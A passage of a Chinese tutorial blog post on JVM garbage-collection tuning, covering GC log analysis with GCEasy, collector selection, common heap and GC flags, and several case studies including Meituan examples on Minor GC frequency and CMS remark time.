\\[PSYoungGen: 729479K->41445K(738304K)\\] 796601K->124936K(870400K), 0.0370655 secs\\] \\[Times: user=0.04 sys=0.02, real=0.04 secs\\]   \n2022-01-12T15:02:49.620-0800: 13.415: \\[GC (Allocation Failure) \\[PSYoungGen: 738277K->26677K(974848K)\\] 821768K->114930K(1106944K), 0.0270382 secs\\] \\[Times: user=0.05 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:52.146-0800: 15.942: \\[GC (Allocation Failure) \\[PSYoungGen: 959541K->17569K(985600K)\\] 1047794K->110447K(1117696K), 0.0274985 secs\\] \\[Times: user=0.05 sys=0.01, real=0.03 secs\\]   \n2022-01-12T15:02:54.110-0800: 17.905: \\[GC (Allocation Failure) \\[PSYoungGen: 950433K->10240K(1236480K)\\] 1043311K->109662K(1368576K), 0.0146713 secs\\] \\[Times: user=0.05 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:54.692-0800: 18.487: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 264005K->3360K(1259520K)\\] 363427K->109573K(1391616K), 0.0086901 secs\\] \\[Times: user=0.03 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:54.701-0800: 18.496: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 3360K->0K(1259520K)\\] \\[ParOldGen: 106213K->54092K(208384K)\\] 109573K->54092K(1467904K), \\[Metaspace: 56204K->56204K(1101824K)\\], 0.1487173 secs\\] \\[Times: user=0.69 sys=0.01, real=0.14 secs\\]   \n2022-01-12T15:02:57.787-0800: 21.583: \\[GC (Allocation Failure) \\[PSYoungGen: 1209856K->49146K(1321984K)\\] 1263948K->116260K(1530368K), 0.0339265 secs\\] \\[Times: user=0.05 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:03:16.198-0800: 39.994: \\[GC (Allocation Failure) \\[PSYoungGen: 1321978K->29589K(1335296K)\\] 1389092K->101049K(1543680K), 0.0214759 secs\\] \\[Times: user=0.06 sys=0.01, real=0.03 secs\\]   \n2022-01-12T15:03:19.021-0800: 42.816: \\[GC (GCLocker Initiated GC) \\[PSYoungGen: 1302421K->60915K(1280512K)\\] 1373881K->180735K(1488896K), 0.0482886 secs\\] \\[Times: user=0.08 sys=0.01, real=0.05 secs\\]   \n2022-01-12T15:03:21.847-0800: 45.642: \\[GC (Allocation Failure) \\[PSYoungGen: 1280499K->89087K(1308672K)\\] 1400321K->228379K(1517056K), 0.0336500 secs\\] \\[Times: user=0.10 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:03:24.516-0800: 48.311: \\[GC (Allocation Failure) \\[PSYoungGen: 1308671K->67295K(1257472K)\\] 1447963K->225652K(1465856K), 0.0381420 secs\\] \\[Times: user=0.07 sys=0.02, real=0.04 secs\\]  \n\n\n\n```\n\n### 指标分析第二步：导入分析工具，尽心分析\n\n打开gceasy.io网站，并选择本地的gc文件，然后点击分析。\n\n（分析的速度根据日志的多少而定，可能会比较慢）\n\n![](./2024/06/16/JVM如何调优/1.png)\n接下来看看分析结果：\n\n### JVM memory size (JVM内存大小)\n\nGCEasy是一款非常好用的在线分析GC日志的工具，打开官网，直接上传gc日志，也可以更加上门的要求进行压缩上传。\n![](./2024/06/16/JVM如何调优/2.png)\n这里的Allocated和Peak分别表示可分配空间和峰值\n\n*   **Allocated**：可分配空间大小。\n\n    **具体含义如下**：指示为每一代分配的大小。此数据点是从GC日志收集的，因此它可能与JVM系统属性指定的大小相匹配，也可能不匹配。假设您已将总堆大小配置为2gb，而在运行时，如果JVM只分配了1gb，那么在本报告中，您将看到分配的大小仅为1gb\n\n*   **Peak：** 分配的峰值。\n\n    **具体含义如下**：每一代的峰值内存利用率。通常它不会超过分配的大小。然而，在少数情况下，我们也看到峰值利用率超出了分配的大小，特别是在G1 GC中\n\n\nJVM memory size ，GCEasy展示了年轻代、老年代、元空间。JVM给分配的大小和程序运行过程中使用的峰值大小。\n\n从JVM memory size展示的信息，我们可以判断是否需要做下面的几件事情。\n\n*   是否需要修改JVM内存（-Xms、-Xmx、-Xmn…）相关配置，比如年轻代和老年代峰值远远小于分配的大小，这个时候我们可以适当的减小内存设置。\n\n*   是否需要调整年轻代和老年代的比例(-XX:NewSize(-Xns)、-XX:MaxNewSize(-Xmn)、-XX:SurvivorRatio=8)。比如老年大的峰值一直小于老年代申请的内存，这个时候我们可以稍微多分点空间给年轻代。\n\n*   是否需要修改元空间(XX:MetaspaceSize，-XX:MaxMetaspaceSize)相关设置。 **年轻代，老年代属于堆区，元空间属于非堆区（直接对接的是机器的内存）**\n\n\n### Key Performance Indicatiors（关键指标）\n\n![](./2024/06/16/JVM如何调优/3.png)\n*   Throughput：吞吐量。\n\n    指的是处理实际事务花费的时间与GC花费的时间的百分比。这个值越高越好\n\n*   Latency：\n\n    延迟情况。这里的延迟情况是指的GC过程花费的时间。具体含义如上图\n\n\nThroughput表示的是吞吐量 Latency表示响应时间 Avg Pause GC Time 平均GC时间 Max Pause GC TIme 最大GC时间\n\nKey Performance Indicators 给我们展示了GC吞吐量（应用程序线程用时占程序总用时的比例，越高越好），每次GC的平均耗时（建议控制在50ms以下），GC最长耗时，每个时间段的GC次数及占比信息。\n\n通过Key Performance Indicators显示的信息里面，我们需要关注下面几个问题：\n\n*   吞吐量，应用花在非GC上的时间百分比（引用花在生产任务上的百分比）。所以吞吐量越高越好。\n\n*   每次GC的平均耗时。越小越好，建议50ms以下。\n\n*   GC最长耗时。越小越好。如果你的应用是一个后台程序，并且任何请求不超过10秒，那么GC最长耗时就不能超过10秒。\n\n\n### Interactive Graphs(交互图)\n\nInteractive Graphs 展示了\n\n**Heap after GC**：GC之后堆的使用情况 **Heap before GC**：GC之前堆的使用情况 **GC Duration**：GC持续时间 **Reclaimed Bytes**：GC回收掉的垃圾对象的内存大小 **Young Gen**：年轻代堆的使用情况 **Old Gen**：老年代堆的使用情况 **Meta Space**：元空间的使用情况 **A & P**：每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。\n\n第一部分是Heap after GC，GC后堆的内存图，堆是用来存储对象的，从图中可以看出，随着GC的进行，垃圾回收器把对象都回收掉了，因此堆的大小逐渐增大。\n![](./2024/06/16/JVM如何调优/4.png)\n第二部分是Heap before GC，这是GC前堆的使用率，可以看出随着程序的运行，堆使用率越来越高，堆被对象占用的内存越来越大。\n![](./2024/06/16/JVM如何调优/5.png)\n第三部分是GC Duration Time，就是GC持续时间。一个GC事件的发生具有多个阶段，而不同的垃圾回收器又有不同的阶段，这里展示不作细分。这些阶段（例如并发标记，并发清除等）与程序线程一起并发运行，此时不会暂停程序线程。但是某些阶段（例如初始标记，清除等）会暂停整个应用程序，所以此图标描述的仅暂停阶段所花费的时间。\n![](./2024/06/16/JVM如何调优/6.png)\n第四部分表示的是GC回收掉的垃圾对象的内存大小。\n![](./2024/06/16/JVM如何调优/7.png)\n第五部分表示的是Young Gen，年轻代的内存分配情况。对象都是朝生夕死，年轻代存放的就是刚刚产生的对象，每进行一次GC，都会GC掉很多垃圾对象，剩下的就是右GC Root关联的对象，这些对象会年龄会逐渐增加，达到了一定阈值就会晋升为老年代的对象。可以看到before GC表示的图线随着时间的进行逐渐增大，也就是年轻代中对象越来越多，而GC事件发生后，年轻代中对象就会减少，也就是after GC图线表示的内存变化趋势。\n![](./2024/06/16/JVM如何调优/8.png)\n第六部分是Old Gen，表示的是老年代的内存分配情况。细心的读者会发现，为啥一开始before GC的内存大小比after GC的内存分配要少呢？这里得先知道老年代存放的都是年龄大的对象，意思就是经过了多次GC都没有被GC掉的对象，就会晋升为老年代的对象。所以这就解释了为啥after GC内存要比before GC内存要大，因为每次GC过后，都会有年轻代的对象晋升为老年代对象。\n![](./2024/06/16/JVM如何调优/9.png)\n第七部分是每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。\n![](./2024/06/16/JVM如何调优/10.png)\n### GC Statistics(GC统计信息)\n\n![](./2024/06/16/JVM如何调优/11.png)\n每种GC总共回收了多少内存、总共用了多长时间、平均时间、以及每种GC的单独统计信息啥的。\n\n### Object Stats(对象的一些统计信息)\n\n![](./2024/06/16/JVM如何调优/12.png)\n### GC Causes(GC的原因信息)\n\n![](./2024/06/16/JVM如何调优/13.png)\n### Memory Leak\n\n由于记录的程序没有内存泄漏，所以这里就没有内存泄漏的日志信息。\n\n此处可以诊断8种OOM中的5种（Java堆内存溢出，超出GC开销限制，请求数组大小超过JVM限制，Permgen空间，元空间）。\n\n四：JVM 常用配置策略\n------------\n\n### 垃圾回收器的选择\n\n选择垃圾回收器时，应根据CPU核心数、关注点（吞吐量或用户停顿时间）以及JDK版本等因素做出合适的选择，以提高应用程序的性能和稳定性。\n\n*   **CPU单核：**\n\n    当系统仅有单核CPU时，Serial垃圾收集器是最佳选择。\n\n    由于单核系统的性能瓶颈主要集中在单一处理器上，使用Serial垃圾收集器能够简化垃圾回收的过程，提高系统的整体性能。\n\n*   **CPU多核：关注吞吐量**\n\n    对于多核CPU且关注系统吞吐量的情况，推荐选择Parallel Scavenge（PS）加 Parallel Old（PO）的组合。\n\n    这种组合利用了多核CPU的并行处理能力，通过并行处理新生代和老年代的垃圾收集，以提高系统的吞吐量和整体性能。\n\n*   **CPU多核，关注用户停顿时间，JDK版本1.6或1.7：**\n\n    如果系统是多核CPU，并且更关注用户停顿时间，特别是在JDK版本为1.6或1.7的情况下，推荐选择Concurrent Mark-Sweep（CMS）垃圾收集器。\n\n    CMS垃圾收集器以减少应用程序停顿时间为目标，通过与应用程序线程并发执行部分垃圾回收操作，从而降低了GC造成的停顿时间，提高了系统的响应速度和用户体验。\n\n*   **CPU多核，关注用户停顿时间，JDK1.8及以上，JVM可用内存6G以上：**\n\n    对于JDK版本为1.8及以上，并且系统具备充足的内存资源（6G及以上），且依然关注用户停顿时间的情况，推荐选择Garbage-First（G1）垃圾收集器。\n\n    G1垃圾收集器是一种面向服务端应用的垃圾收集器，具有高效的垃圾回收、可预测的停顿时间和良好的内存整理能力，适用于对用户停顿时间有较高要求的应用场景。\n\n\n**垃圾回收器的选择 的切换配置：**\n\n```\n\n\n//设置Serial垃圾收集器（新生代）  \n 开启：-XX:+UseSerialGC  \n   \n //设置PS+PO,新生代使用功能Parallel Scavenge 老年代将会使用Parallel Old收集器  \n 开启 -XX:+UseParallelOldGC  \n   \n //CMS垃圾收集器（老年代）  \n 开启 -XX:+UseConcMarkSweepGC  \n   \n //设置G1垃圾收集器  \n 开启 -XX:+UseG1GC  \n\n\n\n```\n\n### JVM参数常用原则\n\n*   对于JVM堆的设置\n\n    通常我们会使用 **\\-Xms** 和 **\\-Xmx** 来设定最小和最大堆大小，将它们设置为相同的值可以防止垃圾收集器在堆大小之间进行收缩，从而减少额外的时间消耗。\n\n*   年轻代和年老代的大小将根据默认比例（通常为1：2）分配堆内存。\n\n    我们可以通过调整 **\\-XX:NewRatio** 参数来调整它们之间的比例，\n\n    也可以通过 **\\-XX:NewSize** 和 **\\-XX:MaxNewSize** 来设置年轻代的绝对大小。\n\n    为了防止年轻代堆大小的调整，通常将 **\\-XX:NewSize** 和 **\\-XX:MaxNewSize** 设置为相同大小。\n\n*   年轻代和年老代大小的合理设置没有标准答案，因此调优时需要观察它们大小变化对系统的影响。\n\n    更大的年轻代会延长普通GC周期但增加每次GC的时间，而更小的年老代会导致更频繁的Full GC。\n\n    选择应根据应用程序对象生命周期的分布情况，例如，如果应用存在大量的临时对象，则应选择更大的年轻代；如果存在大量的持久对象，则应适当增大年老代。\n\n    观察应用一段时间后，根据峰值时年老代所占内存来调整年轻代的大小，但应保留年老代至少1/3的增长空间。\n\n*   在配置较好的机器上（如多核、大内存），可以为年老代选择并行收集算法，使用**XX:+UseParallelOldGC**，默认为串行收集。\n\n*   线程堆栈的设置：每个线程默认会分配1M的堆栈空间，用于存放栈帧、调用参数、局部变量等。\n\n    对于大多数应用来说，这个默认值过大，一般可以将其减小至256K。\n\n    减小线程堆栈大小可以在内存不变的情况下创建更多线程，但这也受限于操作系统的支持。\n\n\n五：常见调优策略\n--------\n\n### 5.1 调整内存大小\n\n*   现象：垃圾收集频率非常频繁\n\n*   措施：考虑增加堆内存大小。\n\n*   说明：\n\n\n频繁的垃圾收集通常是由于内存过小，导致需要不断进行垃圾收集以释放空间来容纳新对象。\n\n因此，增加堆内存大小可以显著降低垃圾收集的频率。\n\n需要注意的是，如果垃圾收集次数虽然频繁但每次回收的对象却很少，那么问题可能不在于内存过小，而是由于内存泄漏导致的对象无法被正确回收，从而引发了频繁的垃圾收集。\n\n在这种情况下，调整内存大小可能无法解决问题，而需要对代码进行进一步的分析和调试。\n\n```\n\n\n //设置堆初始值  \n 指令1：-Xms2g  \n 指令2：-XX:InitialHeapSize=2048m  \n   \n //设置堆区最大值  \n 指令1：\\`-Xmx2g\\`   \n 指令2： -XX:MaxHeapSize=2048m  \n   \n //新生代内存配置  \n 指令1：-Xmn512m  \n 指令2：-XX:MaxNewSize=512m\n\n\n```\n\n### 5.2 调整GC触发时机\n\n*   现象：\n\n    在CMS和G1垃圾回收器下，频繁发生Full GC，导致程序严重卡顿。\n\n*   说明：\n\n\n在G1和CMS的部分GC阶段是并发进行的，即业务线程和垃圾收集线程同时运行。\n\n这意味着在垃圾收集过程中，业务线程可能会生成新的对象。\n\n因此，在进行垃圾收集时，需要预留一部分内存空间来容纳新产生的对象。\n\n如果此时内存空间不足以容纳新对象，JVM会停止并发收集，暂停所有业务线程（STW），以确保垃圾收集正常进行。\n\n可以通过调整GC的触发时机（例如在老年代占用60%时触发GC）来预留足够的空间给业务线程创建的对象。\n\n```\n\n\n //使用多少比例的老年代后开始CMS收集，默认是68%，如果频繁发生SerialOld卡顿，应该调小  \n -XX:CMSInitiatingOccupancyFraction  \n   \n //G1混合垃圾回收周期中要包括的旧区域设置占用率阈值。默认占用率为 65%  \n -XX:G1MixedGCLiveThresholdPercent=65 \n\n\n```\n\n### 5.3 调整对象晋升到老年代年龄阈值\n\n*   现象：\n\n    老年代发生频繁的GC，每次清理回收大量对象。\n\n*   说明：\n\n\n当对象的晋升年龄设定较低时，新生代中的对象很快就会被晋升到老年代。\n\n这导致老年代中对象数量增多，其中很多对象实际上在短时间内就可能被回收。\n\n通过调整对象的晋升年龄，可以减少过早进入老年代的对象数量，从而减少老年代的空间压力和频繁的GC。\n\n注意：提高晋升年龄虽然可以减缓老年代的压力，但同时可能会增加新生代的GC频率，因为对象在新生代的停留时间变长。\n\n此外，新生代中频繁复制这些对象可能会导致新生代的GC时间也相应增长。\n\n在调整晋升年龄时，应综合考虑新生代和老年代的GC性能，以达到最优的系统性能平衡。\n\n```\n\n\n // 进入老年代最小的GC年龄,年轻代对象转换为老年代对象最小年龄值，默认值7  \n -XX:InitialTenuringThreshol=7 \n\n\n```\n\n### 5.4 调整大对象进入老年代的标准\n\n*   现象：\n\n    老年代经常发生频繁的GC，每次回收大量对象，而这些对象的体积都相对较大。\n\n*   说明：\n\n\n大量大对象直接分配到老年代会快速填满老年代空间，导致老年代频繁GC。\n\n为解决此问题，可调整大对象直接进入老年代的标准。\n\n需要注意：将大对象调整为直接进入老年代后，可能会增加新生代的GC频率和时间。\n\n```\n\n\n //新生代可容纳的最大对象,大于则直接会分配到老年代，0代表没有限制。  \n  -XX:PretenureSizeThreshold=1000000 \n\n\n```\n\n### 5.5 调整内存区域大小比率\n\n*   现象：\n\n    某一内存区域频繁发生GC，而其他区域的GC表现正常。\n\n*   说明：\n\n\n频繁的GC可能是由于对应区域的空间不足所致，需要不断进行GC以释放空间。\n\n在JVM堆内存无法增加的情况下，可以考虑调整对应区域的大小比率。\n\n注意：尽管频繁的GC可能是由于空间不足造成的，但也有可能是因为内存泄漏导致内存无法回收，进而引发GC频繁。\n\n因此，在调整内存区域大小比率之前，需要仔细分析是否存在内存泄漏问题。\n\n```\n\n\n // survivor区和Eden区大小比率  \n 指令：-XX:SurvivorRatio=6  //S区和Eden区占新生代比率为1:6,两个S区2:6  \n   \n // 新生代和老年代的占比  \n -XX:NewRatio=4  //表示新生代:老年代 = 1:4 即老年代占整个堆的4/5；默认值=2\n\n\n```\n\n### 5.6 调整对象晋升至老年代的年龄阈值\n\n*   现象：\n\n    老年代频繁进行GC，每次回收大量对象。\n\n*   说明：\n\n\n如果对象的晋升年龄较小，新生代中的对象很快就会晋升至老年代，导致老年代中对象数量增多。\n\n然而，这些对象在接下来的短时间内可能会被回收。为解决老年代空间不足导致的频繁GC问题，可调整对象晋升至老年代的年龄阈值，使对象不那么容易晋升至老年代。\n\n注意：增加对象晋升年龄可能会导致新生代中对象的停留时间增加，从而增加新生代的GC频率，并且复制大对象可能导致新生代GC的时间延长。\n\n在调整晋升年龄时，需综合考虑新生代和老年代的GC性能，以获得最优的系统性能平衡。\n\n### 5.7 调整垃圾回收的触发时机\n\n*   现象：\n\n    G1和CMS垃圾收集器在执行垃圾回收时与应用程序的业务线程并发工作。\n\n    在垃圾回收过程中，业务线程可能生成新对象，需预留内存空间以容纳这些新产生的对象。\n\n    若内存空间不足，JVM会暂停所有业务线程（STW）以确保垃圾回收正常进行。\n\n*   说明：\n\n\n在进行垃圾回收时，若未预留足够的内存空间供新对象使用，可能导致内存压力过大，从而触发STW。\n\n通过调整垃圾回收的触发时机来预留足够的内存空间，如可设定在老年代占用达到一定比例时触发垃圾回收。\n\n这有助于提前释放内存空间，为新对象分配留出足够的空间，从而减少因内存不足而导致的STW情况。\n\n注意：\n\n提早触发垃圾回收会增加老年代垃圾回收的频率，这可能导致一些性能开销，如额外的CPU使用和系统停顿时间。\n\n因此，在调整垃圾回收的触发时机时，需要在性能与内存利用率之间找到恰当的平衡。\n\n### 5.8 设置符合预期的停顿时间\n\n> **现象**： 程序间接性的卡顿 **原因**：如果没有确切的停顿时间设定，垃圾收集器以吞吐量为主，那么垃圾收集时间就会不稳定。 **注意**：不要设置不切实际的停顿时间，单次时间越短也意味着需要更多的GC次数才能回收完原有数量的垃圾.\n\n参数配置：l\n\n```\n\n\n //GC停顿时间，垃圾收集器会尝试用各种手段达到这个时间  \n      -XX:MaxGCPauseMillis \n\n\n```\n\n六： JVM调优案例和实践\n-------------\n\n### 案例1：网站流量增加后，网页响应速度变慢\n\n**问题描述** 在测试环境中，网站速度较快，但一到生产环境就显著变慢。 **问题分析**\n\n1.  **初步诊断**： 通过使用 **jstat -gc** 指令监控线上JVM的GC活动，发现GC频率和所占时间异常高。这表明频繁的GC正影响业务线程的执行，从而导致页面响应缓慢。\n\n2.  **内存调整后的问题**： 增加JVM的堆内存从2GB到16GB后，虽然常规请求的处理速度提高，但出现了间歇性的更长时间卡顿。进一步监控发现，虽然Full GC（FGC）的次数不多，但每次的持续时间过长，有时达到几十秒。\n\n3.  **原因推断**： 增加堆内存后，虽然减少了频繁的垃圾回收，但因为PS+PO垃圾收集器（Parallel Scavenge + Parallel Old）在垃圾标记和收集阶段都需要停止所有工作线程（STW），所以每次GC时业务线程的停顿时间显著增长。\n\n\n**解决方案**\n\n1.  **调整垃圾收集器**： 服务不稳定的根本问题是垃圾回收过程中的停顿时间过长，由于默认的PS+PO组合垃圾收集器导致。为了解决这一问题，可更换为并发类的收集器，如CMS垃圾收集器。\n\n2.  **CMS配置优化**： 根据系统运行的实际情况，调整CMS的启动阈值，预设了合理的停顿时间，以确保不会因为内存回收而影响用户的使用体验。\n\n\n### 案例2：CPU飙升和GC频繁的调优实践\n\n**问题描述：** 随着在线游戏玩家数量的增加，系统出现CPU飙升和GC频繁的情况，导致游戏体验下降。 **问题分析：** 使用监控工具检查系统的CPU使用情况和GC情况，发现系统在高负载情况下CPU占用过高，且GC频率过于频繁。 **解决方案：**\n\n1.  **代码优化**：进行代码审查和性能分析，发现并优化存在不必要的循环操作和资源竞争问题，以减少CPU占用。\n\n2.  **堆内存调整**：增加堆内存大小，减少GC的频率，提高系统的吞吐量和稳定性，确保系统能够应对增加的玩家数量。\n\n3.  **GC算法调优**：根据系统负载情况和硬件环境，选择合适的GC算法，并调整相应的参数，以减少GC造成的性能损耗。例如，针对大堆内存和高并发情况，可以考虑使用并行GC或G1收集器，并根据具体情况调整相关参数以提升性能。\n\n\n### 案例3：数据分析平台系统频繁 Full GC\n\n**问题描述：** 数据分析平台对用户在App中的行为进行定时分析统计，但系统频繁发生Full GC，导致页面打开卡顿，影响用户体验。 **问题分析：**\n\n1.  **CMS GC算法使用**：系统使用CMS（Concurrent Mark-Sweep）GC算法，但频繁的Full GC表明GC调优方面存在问题。\n\n2.  **Young GC后存活对象进入老年代**：使用jstat命令监控发现，每次Young GC后大约有10%的存活对象进入老年代，这意味着Survivor区空间可能设置过小，导致存活对象在Survivor区放不下而提前进入老年代。\n\n\n**解决方案：**\n\n1.  **调整Survivor区大小**：增大Survivor区大小，确保其能容纳Young GC后的存活对象，使存活对象能在Survivor区经历多次Young GC达到年龄阈值后才进入老年代。\n\n2.  **优化存活对象进入老年代的大小**：调整Survivor区大小后，每次Young GC后进入老年代的存活对象稳定在几百KB左右，大大降低了Full GC的频率，提升了系统的稳定性和性能。\n\n\n### 案例4：内存飙高问题定位\n\n**问题描述**：在Java进程中，内存飙高，可能是由于大量对象创建或内存泄漏导致的。\n\n持续的内存飙高可能表明垃圾回收跟不上对象创建速度，或存在内存泄漏导致对象无法回收。 **问题分析：**\n\n1.  **观察垃圾回收情况：**\n\n\n*   使用 **jstat -gc PID 1000** 命令观察GC次数、时间等信息，每隔一秒打印一次。\n\n*   使用 **jmap -histo PID | head -20** 命令查看堆内存占用空间最大的前20个对象类型。\n\n*   如果GC频率高且每次回收的内存空间正常，可能是对象创建速度过快导致内存占用高；如果每次回收的内存很少，可能是内存泄漏。\n\n\n3.  **导出堆内存文件快照：**\n\n\n*   使用 **jmap -dump:live,format=b,file=/home/myheapdump.hprof PID** 命令将堆内存信息导出到文件，以进一步分析内存占用情况。\n\n\n**解决方案：** 通过使用VisualVM对dump文件进行离线分析，识别内存占用较高的对象，并进一步定位到创建这些对象的业务代码位置，以便从代码和业务场景中精确定位具体问题。\n\n### 案例5：Major GC和Minor GC频繁\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\n服务情况：Minor GC每分钟100次 ，Major GC每4分钟一次，单次Minor GC耗时25ms，单次Major GC耗时200ms，接口响应时间50ms。\n\n由于这个服务要求低延时高可用，结合上文中提到的GC对服务响应时间的影响，计算可知由于Minor GC的发生，12.5%的请求响应时间会增加，其中8.3%的请求响应时间会增加25ms，可见当前GC情况对响应时间影响较大。\n\n_（50ms+25ms）× 100次/60000ms = 12.5%，50ms × 100次/60000ms = 8.3%_ 。\n\n优化目标：降低TP99、TP90时间。\n\n#### 优化\n\n首先优化Minor GC频繁问题。通常情况下，由于新生代空间较小，Eden区很快被填满，就会导致频繁Minor GC，因此可以通过增大新生代空间来降低Minor GC的频率。例如在相同的内存分配率的前提下，新生代中的Eden区增加一倍，Minor GC的次数就会减少一半。\n\n这时很多人有这样的疑问，扩容Eden区虽然可以减少Minor GC的次数，但会增加单次Minor GC时间么？根据上面公式，如果单次Minor GC时间也增加，很难保证最后的优化效果。\n\n结合下面情况来分析，单次Minor GC时间主要受哪些因素影响？是否和新生代大小存在线性关系？\n\n首先，单次Minor GC时间由以下两部分组成：T1（扫描新生代）和 T2（复制存活对象到Survivor区）如下图。（注：这里为了简化问题，我们认为T1只扫描新生代判断对象是否存活的时间，其实该阶段还需要扫描部分老年代，后面案例中有详细描述。）\n\n![](./2024/06/16/JVM如何调优/14.png)\n*   扩容前：新生代容量为R ，假设对象A的存活时间为750ms，Minor GC间隔500ms，那么本次Minor GC时间= T1（扫描新生代R）+T2（复制对象A到S）。\n\n*   扩容后：新生代容量为2R ，对象A的生命周期为750ms，那么Minor GC间隔增加为1000ms，此时Minor GC对象A已不再存活，不需要把它复制到Survivor区，那么本次GC时间 = 2 × T1（扫描新生代R），没有T2复制时间。\n\n\n可见，扩容后，Minor GC时增加了T1（扫描时间），但省去T2（复制对象）的时间，更重要的是对于虚拟机来说，复制对象的成本要远高于扫描成本，所以，单次**Minor GC时间更多取决于GC后存活对象的数量，而非Eden区的大小**。因此如果堆中短期对象很多，那么扩容新生代，单次Minor GC时间不会显著增加。下面需要确认下服务中对象的生命周期分布情况：\n\n![](./2024/06/16/JVM如何调优/15.png)\n通过上图GC日志中两处红色框标记内容可知：\n\n1.  new threshold = 2（动态年龄判断，对象的晋升年龄阈值为2），对象仅经历2次Minor GC后就晋升到老年代，这样老年代会迅速被填满，直接导致了频繁的Major GC。\n\n2.  Major GC后老年代使用空间为300M+，意味着此时绝大多数(86% = 2G/2.3G)的对象已经不再存活，也就是说生命周期长的对象占比很小。\n\n\n由此可见，服务中存在大量短期临时对象，扩容新生代空间后，Minor GC频率降低，对象在新生代得到充分回收，只有生命周期长的对象才进入老年代。这样老年代增速变慢，Major GC频率自然也会降低。\n\n#### 优化结果\n\n通过扩容新生代为为原来的三倍，单次Minor GC时间增加小于5ms，频率下降了60%，服务响应时间TP90，TP99都下降了10ms+，服务可用性得到提升。\n\n调整前：\n![](./2024/06/16/JVM如何调优/16.png)\n调整后：\n![](./2024/06/16/JVM如何调优/17.png)\n#### 小结\n\n如何选择各分区大小应该依赖应用程序中**对象生命周期的分布情况：如果应用存在大量的短期对象，应该选择较大的年轻代；如果存在相对较多的持久对象，老年代应该适当增大。**\n\n#### 更多思考\n\n关于上文中提到晋升年龄阈值为2，很多同学有疑问，为什么设置了MaxTenuringThreshold=15，对象仍然仅经历2次Minor GC，就晋升到老年代？这里涉及到“动态年龄计算”的概念。\n\n**动态年龄计算**：\n\nHotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值。在本案例中，调优前：Survivor区 = 64M，desired survivor = 32M，此时Survivor区中age<=2的对象累计大小为41M，41M大于32M，所以晋升年龄阈值被设置为2，下次Minor GC时将年龄超过2的对象被晋升到老年代。\n\nJVM引入动态年龄计算，主要基于如下两点考虑：\n\n1.  如果固定按照MaxTenuringThreshold设定的阈值作为晋升条件：\n\n    a）MaxTenuringThreshold设置的过大，原本应该晋升的对象一直停留在Survivor区，直到Survivor区溢出，一旦溢出发生，Eden+Svuvivor中对象将不再依据年龄全部提升到老年代，这样对象老化的机制就失效了。\n\n    b）MaxTenuringThreshold设置的过小，“过早晋升”即对象不能在新生代充分被回收，大量短期对象被晋升到老年代，老年代空间迅速增长，引起频繁的Major GC。分代回收失去了意义，严重影响GC性能。\n\n2.  相同应用在不同时间的表现不同：特殊任务的执行或者流量成分的变化，都会导致对象的生命周期分布发生波动，那么固定的阈值设定，因为无法动态适应变化，会造成和上面相同的问题。\n\n\n总结来说，为了更好的适应不同程序的内存情况，虚拟机并不总是要求对象年龄必须达到Maxtenuringthreshhold再晋级老年代。\n\n### 美团案例6: 请求高峰期发生GC，导致服务可用性下降\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\nGC日志显示，高峰期CMS在重标记（Remark）阶段耗时1.39s。\n\nRemark阶段是Stop-The-World（以下简称为STW）的，即在执行垃圾回收时，Java应用程序中除了垃圾回收器线程之外其他所有线程都被挂起，意味着在此期间，用户正常工作的线程全部被暂停下来，这是低延时服务不能接受的。本次优化目标是降低Remark时间。\n\n![](./2024/06/16/JVM如何调优/18.png)\n#### 优化\n\n解决问题前，先回顾一下CMS的四个主要阶段，以及各个阶段的工作内容。下图展示了CMS各个阶段可以标记的对象，用不同颜色区分。\n\n1.  Init-mark初始标记(STW) ，该阶段进行可达性分析，标记GC ROOT能直接关联到的对象，所以很快。\n\n2.  Concurrent-mark并发标记，由前阶段标记过的绿色对象出发，所有可到达的对象都在本阶段中标记。\n\n3.  Remark重标记(STW) ，暂停所有用户线程，重新扫描堆中的对象，进行可达性分析，标记活着的对象。因为并发标记阶段是和用户线程并发执行的过程，所以该过程中可能有用户线程修改某些活跃对象的字段，指向了一个未标记过的对象，如下图中红色对象在并发标记开始时不可达，但是并行期间引用发生变化，变为对象可达，这个阶段需要重新标记出此类对象，防止在下一阶段被清理掉，这个过程也是需要STW的。特别需要注意一点，这个阶段是以新生代中对象为根来判断对象是否存活的。\n\n4.  并发清理，进行并发的垃圾清理。\n\n\n![](./2024/06/16/JVM如何调优/19.png)\n可见，Remark阶段主要是通过扫描堆来判断对象是否存活。那么准确判断对象是否存活，需要扫描哪些对象？CMS对老年代做回收，Remark阶段仅扫描老年代是否可行？结论是不可行，原因如下：\n![](./2024/06/16/JVM如何调优/20.png)\n如果仅扫描老年代中对象，即以老年代中对象为根，判断对象是否存在引用，上图中，对象A因为引用存在新生代中，它在Remark阶段就不会被修正标记为可达，GC时会被错误回收。\n\n新生代对象持有老年代中对象的引用，这种情况称为**“跨代引用”**。因它的存在，Remark阶段必须扫描整个堆来判断对象是否存活，包括图中灰色的不可达对象。\n\n灰色对象已经不可达，但仍然需要扫描的原因：**新生代GC和老年代的GC是各自分开独立进行的**，只有Minor GC时才会使用根搜索算法，标记新生代对象是否可达，也就是说虽然一些对象已经不可达，但在Minor GC发生前不会被标记为不可达，CMS也无法辨认哪些对象存活，只能全堆扫描（新生代+老年代）。\n\n由此可见堆中对象的数目影响了Remark阶段耗时。 分析GC日志可以得出同样的规律，Remark耗时>500ms时，新生代使用率都在75%以上。这样降低Remark阶段耗时问题转换成如何减少新生代对象数量。\n\n新生代中对象的特点是“朝生夕灭”，这样如果Remark前执行一次Minor 